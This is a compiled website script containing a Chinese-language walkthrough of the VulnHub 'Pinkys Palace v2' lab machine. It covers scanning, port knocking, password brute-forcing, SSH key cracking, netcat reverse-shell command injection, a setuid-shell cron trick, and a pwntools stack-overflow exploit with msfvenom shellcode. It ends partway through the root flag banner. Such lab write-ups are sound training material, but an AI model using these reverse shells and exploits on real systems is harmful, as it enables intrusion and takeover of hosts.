"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[7453],{10355:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>c,contentTitle:()=>l,default:()=>d,frontMatter:()=>a,metadata:()=>s,toc:()=>p});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/Pinkys Palace v2","title":"Pinkys Palace v2","description":"port scan","source":"@site/docs/VulnHub/Virtual Machines/Pinkys Palace v2.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/Pinkys Palace v2","permalink":"/docs/VulnHub/Virtual Machines/Pinkys Palace v2","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/Pinkys Palace v2.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"Mr-robot","permalink":"/docs/VulnHub/Virtual Machines/Mr-robot"},"next":{"title":"Prime1","permalink":"/docs/VulnHub/Virtual Machines/Prime1"}}');var i=r(74848),t=r(28453);const a={},l=void 0,c={},p=[{value:"port scan",id:"port-scan",level:2},{value:"web",id:"web",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2},{value:"shellcode\u6784\u9020\u3001\u751f\u6210",id:"shellcode\u6784\u9020\u751f\u6210",level:3}];function o(n){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,t.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h2,{id:"port-scan",children:"port scan"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Sun Nov 17 00:24:08 2024 as: nmap -sT --min-rate 8000 -p- -oN nmap_results/port 192.168.27.9\r\nNmap scan report for 192.168.27.9\r\nHost is up (0.00020s latency).\r\nNot shown: 65531 closed tcp ports (conn-refused)\r\nPORT      STATE    SERVICE\r\n80/tcp    open     http\r\n4655/tcp  filtered unknown\r\n7654/tcp  filtered unknown\r\n31337/tcp filtered Elite\r\nMAC Address: 00:0C:29:71:DA:4C (VMware)\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Sun Nov 17 00:25:10 2024 as: nmap -sT -sV -sC -O -p80,4655,7654,31337 -oN nmap_results/detils 192.168.27.9\r\nNmap scan report for 192.168.27.9\r\nHost is up (0.0013s latency).\r\n\r\nPORT      STATE    SERVICE VERSION\r\n80/tcp    open     http    Apache httpd 2.4.25 ((Debian))\r\n|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site\r\n|_http-generator: WordPress 4.9.4\r\n|_http-server-header: Apache/2.4.25 (Debian)\r\n4655/tcp  filtered unknown\r\n7654/tcp  filtered unknown\r\n31337/tcp filtered Elite\r\nMAC Address: 00:0C:29:71:DA:4C (VMware)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 3.X|4.X\r\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\r\nOS details: Linux 3.2 - 4.9\r\nNetwork Distance: 1 hop\n"})}),"\n",(0,i.jsx)(e.p,{children:"vuln scan"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Sun Nov 17 00:26:02 2024 as: nmap --script=vuln -p80,4655,7654,31337 -oN nmap_results/vuln 192.168.27.9\r\nNmap scan report for 192.168.27.9\r\nHost is up (0.00091s latency).\r\n\r\nPORT      STATE    SERVICE\r\n80/tcp    open     http\r\n| http-csrf: \r\n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.27.9\r\n|   Found the following possible CSRF vulnerabilities: \r\n|     \r\n|     Path: http://192.168.27.9:80/\r\n|     Form id: search-form-67397e7aa1d2c\r\n|_    Form action: http://pinkydb/\r\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\r\n|_http-dombased-xss: Couldn't find any DOM based XSS.\r\n| http-enum: \r\n|   /wp-login.php: Possible admin folder\r\n|   /readme.html: Wordpress version: 2 \r\n|   /: WordPress version: 4.9.4\r\n|   /wp-includes/images/rss.png: Wordpress version 2.2 found.\r\n|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.\r\n|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.\r\n|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.\r\n|   /wp-login.php: Wordpress login page.\r\n|   /wp-admin/upgrade.php: Wordpress login page.\r\n|   /readme.html: Interesting, a readme.\r\n|_  /secret/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'\r\n4655/tcp  filtered unknown\r\n7654/tcp  filtered unknown\r\n31337/tcp filtered Elite\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"4655/tcp  filtered unknown\r\n7654/tcp  filtered unknown\r\n31337/tcp filtered Elite\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5168\u662f\u88ab\u8fc7\u6ee4\u72b6\u6001\uff0c\u5148\u770b80\u7aef\u53e3"}),"\n",(0,i.jsx)(e.h2,{id:"web",children:"web"}),"\n",(0,i.jsx)(e.p,{children:"\u6839\u636e\u9776\u673a\u7684\u63cf\u8ff0\uff0c\u6dfb\u52a0host\u89e3\u6790\u8bb0\u5f55"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"echo 192.168.27.9 pinkydb | sudo tee -a /etc/hosts\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.code,{children:"wordpress 4.9.4"})}),"\n",(0,i.jsx)(e.p,{children:"\u4f7f\u7528wpscan\u626b\u63cf"}),"\n",(0,i.jsx)(e.p,{children:"\u679a\u4e3e\u7528\u6237"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"wpscan --url http://pinkydb/ -e u\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"[+] pinky1337\r\n | Found By: Author Posts - Display Name (Passive Detection)\r\n | Confirmed By:\r\n |  Rss Generator (Passive Detection)\r\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\r\n |  Login Error Messages (Aggressive Detection)\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u6709\u4e00\u4e2a",(0,i.jsx)(e.code,{children:"pinky1337"}),"\u7528\u6237"]}),"\n",(0,i.jsx)(e.p,{children:"\u76ee\u5f55\u626b\u63cf"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"dirsearch -u http://pinkydb/\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-text",children:"301     0B   http://pinkydb/index.php    -> REDIRECTS TO: http://pinkydb/\r\n301     0B   http://pinkydb/index.php/login/    -> REDIRECTS TO: http://pinkydb/login/\r\n200     7KB  http://pinkydb/license.txt\r\n200     3KB  http://pinkydb/readme.html\r\n301   303B   http://pinkydb/secret    -> REDIRECTS TO: http://pinkydb/secret/\r\n200   449B   http://pinkydb/secret/\r\n302     0B   http://pinkydb/wordpress/    -> REDIRECTS TO: http://pinkydb/wordpress/wp-admin/setup-config.php\r\n301   305B   http://pinkydb/wp-admin    -> REDIRECTS TO: http://pinkydb/wp-admin/\r\n302     0B   http://pinkydb/wordpress/wp-login.php    -> REDIRECTS TO: http://pinkydb/wordpress/wp-admin/setup-config.php\r\n400     1B   http://pinkydb/wp-admin/admin-ajax.php\r\n302     0B   http://pinkydb/wp-admin/    -> REDIRECTS TO: http://pinkydb/wp-login.php\r\n500     3KB  http://pinkydb/wp-admin/setup-config.php\r\n200     0B   http://pinkydb/wp-config.php\r\n200   528B   http://pinkydb/wp-admin/install.php\r\n301   307B   http://pinkydb/wp-content    -> REDIRECTS TO: http://pinkydb/wp-content/\r\n200     0B   http://pinkydb/wp-content/\r\n200    84B   http://pinkydb/wp-content/plugins/akismet/akismet.php\r\n500     0B   http://pinkydb/wp-content/plugins/hello.php\r\n301   308B   http://pinkydb/wp-includes    -> REDIRECTS TO: http://pinkydb/wp-includes/\r\n500     0B   http://pinkydb/wp-includes/rss-functions.php\r\n200     0B   http://pinkydb/wp-cron.php\r\n200     1KB  http://pinkydb/wp-login.php\r\n302     0B   http://pinkydb/wp-signup.php    -> REDIRECTS TO: http://pinkydb/wp-login.php\r\n405    42B   http://pinkydb/xmlrpc.php\r\n200     3KB  http://pinkydb/wp-includes/\n"})}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"secret"}),"\u76ee\u5f55\u5b58\u5728\u6587\u4ef6"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.a,{href:"http://pinkydb/secret/bambam.txt",children:"http://pinkydb/secret/bambam.txt"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"8890\r\n7000\r\n666\r\n\r\npinkydb\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u50cf\u662f\u4e09\u4e2a\u7aef\u53e3\u548c\u4e00\u4e2a\u7528\u6237\u540d\uff0c\u5c06\u7528\u6237\u540d\u8bb0\u5f55\u4e0b"}),"\n",(0,i.jsx)(e.p,{children:"\u7ed3\u5408\u4e09\u4e2a\u7aef\u53e3\u90fd\u662f\u5173\u95ed\u72b6\u6001\uff0c\u731c\u6d4b\u9700\u8981\u6572\u95e8\u5f00\u542f\u670d\u52a1"}),"\n",(0,i.jsxs)(e.p,{children:["\u4f7f\u7528",(0,i.jsx)(e.code,{children:"knock"}),"\u5de5\u5177\uff0c\u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u53d1\u73b0",(0,i.jsx)(e.code,{children:"7000 666 8890"}),"\u987a\u5e8f\u53ef\u4ee5\u6210\u529f"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(root\u327fkali)-[~/vulnhub/Pinkys-Palace2]\r\n\u2514\u2500# knock -v 192.168.27.9 7000 666 8890 \r\nhitting tcp 192.168.27.9:7000\r\nhitting tcp 192.168.27.9:666\r\nhitting tcp 192.168.27.9:8890\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u4e5f\u53ef\u4ee5\u5199\u4e00\u4e2a\u811a\u672c\uff0c",(0,i.jsx)(e.code,{children:"knockd.txt"}),"\u662f\u7aef\u53e3\u5e8f\u5217"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"#!/bin/bash\r\nwhile read -r line\r\ndo\r\necho '---------------'\r\nknock -v 192.168.27.9 $line\r\ndone < knockd.txt\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-text",children:"8890 7000 666\r\n8890 666 7000\r\n7000 8890 666\r\n7000 666 8890\r\n666 8890 7000\r\n666 7000 8890\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u518d\u6b21\u8fdb\u884c\u626b\u63cf"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Tue Nov 19 23:40:43 2024 as: nmap -T3 -sT -sV -sC -O -p4655,7654,31337 -oN nmap_results/detil pinkydb\r\nNmap scan report for pinkydb (192.168.27.9)\r\nHost is up (0.00072s latency).\r\n\r\nPORT      STATE SERVICE VERSION\r\n4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)\r\n| ssh-hostkey: \r\n|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 (RSA)\r\n|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a (ECDSA)\r\n|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 (ED25519)\r\n7654/tcp  open  http    nginx 1.10.3\r\n|_http-title: Pinkys Database\r\n|_http-server-header: nginx/1.10.3\r\n31337/tcp open  Elite?\r\n| fingerprint-strings: \r\n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck: \r\n|     [+] Welcome to The Daemon [+]\r\n|     This is soon to be our backdoor\r\n|     into Pinky's Palace.\r\n|   GetRequest: \r\n|     [+] Welcome to The Daemon [+]\r\n|     This is soon to be our backdoor\r\n|     into Pinky's Palace.\r\n|     HTTP/1.0\r\n|   HTTPOptions: \r\n|     [+] Welcome to The Daemon [+]\r\n|     This is soon to be our backdoor\r\n|     into Pinky's Palace.\r\n|     OPTIONS / HTTP/1.0\r\n|   Help: \r\n|     [+] Welcome to The Daemon [+]\r\n|     This is soon to be our backdoor\r\n|     into Pinky's Palace.\r\n|     HELP\r\n|   RTSPRequest: \r\n|     [+] Welcome to The Daemon [+]\r\n|     This is soon to be our backdoor\r\n|     into Pinky's Palace.\r\n|     OPTIONS / RTSP/1.0\r\n|   SIPOptions: \r\n|     [+] Welcome to The Daemon [+]\r\n|     This is soon to be our backdoor\r\n|     into Pinky's Palace.\r\n|     OPTIONS sip:nm SIP/2.0\r\n|     Via: SIP/2.0/TCP nm;branch=foo\r\n|     From: <sip:nm@nm>;tag=root\r\n|     <sip:nm2@nm2>\r\n|     Call-ID: 50000\r\n|     CSeq: 42 OPTIONS\r\n|     Max-Forwards: 70\r\n|     Content-Length: 0\r\n|     Contact: <sip:nm@nm>\r\n|_    Accept: application/sdp\r\nMAC Address: 00:0C:29:71:DA:4C (VMware)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 3.X|4.X\r\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\r\nOS details: Linux 3.2 - 4.9\r\nNetwork Distance: 1 hop\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u7aef\u53e3\u73b0\u5728\u662f\u5f00\u653e\u72b6\u6001\uff0c",(0,i.jsx)(e.code,{children:"4655"}),"\u7aef\u53e3\u662fSSH\u670d\u52a1\uff0c",(0,i.jsx)(e.code,{children:"7654"}),"\u662fHTTP\u670d\u52a1"]}),"\n",(0,i.jsx)(e.p,{children:"\u8bbf\u95ee7654\u7aef\u53e3"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241120130447791.png",alt:"image-20241120130447791"})}),"\n",(0,i.jsxs)(e.p,{children:["\u8fdb\u884c\u7206\u7834\uff0c\u7528\u6237\u540d\u6709\u4e24\u4e2a",(0,i.jsx)(e.code,{children:"pinky"}),"\u548c",(0,i.jsx)(e.code,{children:"pinkdb"})]}),"\n",(0,i.jsxs)(e.p,{children:["\u5229\u7528",(0,i.jsx)(e.code,{children:"cewl"}),"\u5de5\u5177\u751f\u6210\u793e\u5de5\u5b57\u5178"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"cewl http://pinkydb/ -w pass.txt\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5229\u7528john\u7684\u5185\u7f6e\u7684\u5bc6\u7801\u751f\u6210\u89c4\u5219\uff0c\u751f\u6210\u4e00\u4e2a\u65b0\u5b57\u5178"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"john --rules --wordlist=pass.txt --stdout | tee wordlist.txt\n"})}),"\n",(0,i.jsx)(e.p,{children:"hydra\u8fdb\u884c\u7206\u7834"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:'hydra -L user_list -P pass.txt pinkydb -s 7654 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid Username"\n'})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241120141259190.png",alt:"image-20241120141259190"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"[7654][http-post-form] host: pinkydb   login: pinky   password: Passione\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6210\u529f\u767b\u5f55\u540e\u53f0"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.a,{href:"http://pinkydb:7654/credentialsdir1425364865/notes.txt",children:"http://pinkydb:7654/credentialsdir1425364865/notes.txt"})}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsxs)(e.ul,{children:["\n",(0,i.jsx)(e.li,{children:"Stefano"}),"\n",(0,i.jsx)(e.li,{children:"Intern Web developer"}),"\n",(0,i.jsx)(e.li,{children:"Created RSA key for security for him to login"}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u8fd8\u6709\u4e00\u4e2a\u79c1\u94a5\u6587\u4ef6"}),"\n",(0,i.jsx)(e.p,{children:"\u79c1\u94a5\u6587\u4ef6\u88ab\u52a0\u5bc6\u4e86\uff0c\u8fdb\u884c\u7206\u7834"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"ssh2john id_rsa > ssh_hash\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash\n"})}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"id_rsa:secretz101"}),"\uff0c\u6210\u529f\u7206\u7834\u5bc6\u7801\uff0cSSH\u767b\u5f55\u6210\u529f"]}),"\n",(0,i.jsx)(e.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,i.jsx)(e.p,{children:"\u5b58\u5728\u4e24\u4e2a\u6587\u4ef6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"stefano@Pinkys-Palace:~/tools$ cat note.txt \r\nPinky made me this program so I can easily send messages to him.\r\nstefano@Pinkys-Palace:~/tools$ file qsub \r\nqsub: setuid executable, regular file, no read permission\n"})}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"qsub"}),"\u662f\u4e00\u4e2a\u53d1\u4fe1\u606f\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u6ca1\u6709\u8bfb\u6743\u9650"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"stefano@Pinkys-Palace:~/tools$ ls -la\r\ntotal 28\r\ndrwxr-xr-x 2 stefano stefano   4096 Mar 17  2018 .\r\ndrwxr-xr-x 4 stefano stefano   4096 Mar 17  2018 ..\r\n-rw-r--r-- 1 stefano stefano     65 Mar 16  2018 note.txt\r\n-rwsr----x 1 pinky   www-data 13384 Mar 16  2018 qsub\n"})}),"\n",(0,i.jsx)(e.p,{children:"www-data\u7ec4\u53ef\u4ee5\u8bfb\uff0c\u8fd4\u56deweb\u7aef"}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u91cc\u6709\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.a,{href:"http://pinkydb:7654/pageegap.php?1337=/home/stefano/tools/qsub",children:"http://pinkydb:7654/pageegap.php?1337=/home/stefano/tools/qsub"})}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241120142215403.png",alt:"image-20241120142215403"})}),"\n",(0,i.jsx)(e.p,{children:"wget\u4e0b\u6765\uff0cida\u5206\u6790"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241120142526086.png",alt:"image-20241120142526086"})}),"\n",(0,i.jsxs)(e.p,{children:["\u5bc6\u7801\u5c31\u662f\u73af\u5883\u53d8\u91cf",(0,i.jsx)(e.code,{children:"TERM"}),"\u7684\u503c"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"stefano@Pinkys-Palace:~/tools$ echo $TERM\r\nxterm-256color\r\nstefano@Pinkys-Palace:~/tools$ ./qsub id\r\n[+] Input Password: xterm-256color\r\n[+] Welcome to Question Submit!\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u63a5\u7740\u67e5\u770b\u6700\u540e\u7684",(0,i.jsx)(e.code,{children:"send"}),"\u51fd\u6570"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241120142842484.png",alt:"image-20241120142842484"})}),"\n",(0,i.jsx)(e.p,{children:"\u5c06\u53d1\u9001\u7684\u4fe1\u606f\u8ffd\u52a0\u5199\u5165txt\u6587\u4ef6"}),"\n",(0,i.jsx)(e.p,{children:"\u5229\u7528\u5206\u53f7\u6267\u884c\u591a\u6761\u547d\u4ee4\u5373\u53ef"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"./qsub ';(nc -e /bin/bash 192.168.27.3 1234)'\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6210\u529f\u53cd\u5f39shell"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"python -c 'import pty; pty.spawn(\"/bin/bash\")'"}),"\n",(0,i.jsx)(e.p,{children:"newgrp\u5207\u6362\u5230\u9ed8\u8ba4\u7ec4"}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"pinky@Pinkys-Palace:~/tools$ id\r\nid\r\nuid=1000(pinky) gid=1002(stefano) groups=1002(stefano)\r\npinky@Pinkys-Palace:~/tools$ newgrp\r\nnewgrp\r\npinky@Pinkys-Palace:~/tools$ id\r\nid\r\nuid=1000(pinky) gid=1000(pinky) groups=1000(pinky),1002(stefano)\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u8fdb\u5165\u5230",(0,i.jsx)(e.code,{children:"pinky"}),"\u5bb6\u76ee\u5f55\uff0c\u67e5\u770bbash\u5386\u53f2\u547d\u4ee4"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"pinky@Pinkys-Palace:/home/pinky$ cat .bash_history\r\ncat .bash_history\r\nls -al\r\ncd\r\nls -al\r\ncd /usr/local/bin\r\nls -al\r\nvim backup.sh \r\nsu demon\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"pinky@Pinkys-Palace:~/tools$ cd /usr/local/bin\r\ncd /usr/local/bin\r\npinky@Pinkys-Palace:/usr/local/bin$ ls\r\nls\r\nbackup.sh\r\npinky@Pinkys-Palace:/usr/local/bin$ cat backup.sh\r\ncat backup.sh\r\ncat: backup.sh: Permission denied\r\npinky@Pinkys-Palace:/usr/local/bin$ ls -la\r\nls -la                              \r\ntotal 12                                                                             \r\ndrwxrwsr-x  2 root  staff 4096 Mar 17  2018 .\r\ndrwxrwsr-x 10 root  staff 4096 Mar 17  2018 ..\r\n-rwxrwx---  1 demon pinky  181 Nov 16 23:44 backup.sh\r\npinky@Pinkys-Palace:/usr/local/bin$ newgrp                              \r\nnewgrp\r\npinky@Pinkys-Palace:/usr/local/bin$ cat backup.sh\r\ncat backup.sh\r\n#!/bin/bash\r\n\r\nrm /home/demon/backups/backup.tar.gz\r\ntar cvzf /home/demon/backups/backup.tar.gz /var/www/html\r\n#\r\n#\r\n#\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u731c\u6d4b\u662f\u4e00\u4e2a\u5b9a\u65f6\u5907\u4efd\u4efb\u52a1\uff0c\u5c1d\u8bd5\u5199\u5165\u53cd\u5f39shell"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"cp /bin/bash /tmp/tmp;chmod ugo+x /tmp/tmp;chmod u+s /tmp/tmp\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"pinky@Pinkys-Palace:/tmp$ ./tmp -p\r\n./tmp -p\r\ntmp-4.4$ id\r\nid\r\nuid=1000(pinky) gid=1000(pinky) euid=1001(demon) groups=1000(pinky),1002(stefano)\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u67e5\u627eroot\u7684\u8fdb\u7a0b"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"tmp-4.4$ ps -aux | grep root\r\nroot        451  0.0  0.0   4040   992 ?        Ss   20:39   0:00 /daemon/panel\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5229\u7528root\u6743\u9650\u8fd0\u884c\u7684panel\u7a0b\u5e8f\uff08ELF 64-bit\uff09\u6808\u6ea2\u51fa\u6f0f\u6d1e\u8fdb\u884c\u63d0\u6743"}),"\n",(0,i.jsx)(e.h3,{id:"shellcode\u6784\u9020\u751f\u6210",children:"shellcode\u6784\u9020\u3001\u751f\u6210"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=192.168.27.3 LPORT=3344 -b '\\x00' -f python -o shellcode\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:'\u2500\u2500(root\u327fkali)-[~/vulnhub/Pinkys-Palace2]\r\n\u2514\u2500# cat shellcode                                      \r\nbuf =  b""\r\nbuf += b"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff\\x48\\x8d"\r\nbuf += b"\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\\x4b\\xda\\x32\\x32\\xb8"\r\nbuf += b"\\xe2\\x1c\\x0a\\x48\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff"\r\nbuf += b"\\xff\\xe2\\xf4\\x21\\xf3\\x6a\\xab\\xd2\\xe0\\x43\\x60\\x4a"\r\nbuf += b"\\x84\\x3d\\x37\\xf0\\x75\\x54\\xb3\\x49\\xda\\x3f\\x22\\x78"\r\nbuf += b"\\x4a\\x07\\x09\\x1a\\x92\\xbb\\xd4\\xd2\\xf2\\x46\\x60\\x61"\r\nbuf += b"\\x82\\x3d\\x37\\xd2\\xe1\\x42\\x42\\xb4\\x14\\x58\\x13\\xe0"\r\nbuf += b"\\xed\\x19\\x7f\\xbd\\xb0\\x09\\x6a\\x21\\xaa\\xa7\\x25\\x29"\r\nbuf += b"\\xb3\\x5c\\x1d\\xcb\\x8a\\x1c\\x59\\x03\\x53\\xd5\\x60\\xef"\r\nbuf += b"\\xaa\\x95\\xec\\x44\\xdf\\x32\\x32\\xb8\\xe2\\x1c\\x0a"\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u6700\u540e\u7ed3\u679c\uff1a\u62fc\u63a5 [\\x90] \u548c [\\xfb\\x0c\\x40\\x00]"}),"\n",(0,i.jsx)(e.p,{children:"python\u811a\u672c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:'from pwn import *\r\n\r\nbuf =  b""\r\nbuf += b"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff\\x48\\x8d"\r\nbuf += b"\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\\xea\\xc6\\x79\\x25\\x55"\r\nbuf += b"\\x6f\\x84\\x50\\x48\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff"\r\nbuf += b"\\xff\\xe2\\xf4\\x80\\xef\\x21\\xbc\\x3f\\x6d\\xdb\\x3a\\xeb"\r\nbuf += b"\\x98\\x76\\x20\\x1d\\xf8\\xcc\\xe9\\xe8\\xc6\\x74\\x35\\x95"\r\nbuf += b"\\xc7\\x9f\\x53\\xbb\\x8e\\xf0\\xc3\\x3f\\x7f\\xde\\x3a\\xc0"\r\nbuf += b"\\x9e\\x76\\x20\\x3f\\x6c\\xda\\x18\\x15\\x08\\x13\\x04\\x0d"\r\nbuf += b"\\x60\\x81\\x25\\x1c\\xac\\x42\\x7d\\xcc\\x27\\x3f\\x7f\\x88"\r\nbuf += b"\\xaf\\x17\\x0a\\x26\\x07\\x84\\x03\\xa2\\x4f\\x9e\\x77\\x02"\r\nbuf += b"\\x27\\x0d\\xb6\\xe5\\xc3\\x79\\x25\\x55\\x6f\\x84\\x50\\x90"\r\n\r\nret = p64(0x400cfb)\r\n#ret = "\\xfb\\x0c\\x40\\x00"\r\nprint (ret)\r\npayload = buf + ret\r\n\r\nr = remote("192.168.27.9", 31337)\r\nr.recv()\r\nr.send(payload)\r\nprint("ok")\n'})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241120150824146.png",alt:"image-20241120150824146"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"root@Pinkys-Palace:/root# cat root.txt\r\ncat root.txt\r\n\r\n ____  _       _          _\r\n|  _ \\(_)_ __ | | ___   _( )___\r\n| |_) | | '_ \\| |/ / | | |// __|\r\n|  __/| | | | |   <| |_| | \\__ \\\r\n|_|   |_|_| |_|_|\\_\\\\__, | |___/\r\n                    |___/\r\n ____       _\r\n|  _ \\ __ _| | __ _  ___ ___\r\n| |_) / _` | 